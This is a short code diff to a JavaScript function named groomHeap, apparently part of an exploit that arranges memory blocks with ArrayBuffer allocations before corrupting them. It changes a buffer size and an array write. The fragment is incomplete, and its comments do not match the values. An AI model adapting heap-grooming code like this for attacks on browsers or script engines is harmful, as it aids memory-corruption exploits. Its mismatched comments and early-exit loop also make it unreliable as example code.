@@ -25,7 +25,7 @@ function groomHeap() {
 
     // Allocate and deallocate in patterns
     for (let i = 0; i < 4096; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(UUU); // Allocate smaller blocks
+        let buffer = new ArrayBuffer(4096); // Allocate smaller blocks
         tempArray.push(buffer);
         UUU++;
     }
@@ -55,7 +55,7 @@ let c = new ArrayBuffer(32);
             //let a = null;
             // Fill with known data
             for (let j = 0; j < se_a.length; j++) {
-                se_a[UUU] = 0x42; // Fill with 'A'
+                se_a[varx] = null; // Fill with 'A'
                 break;
             }
        
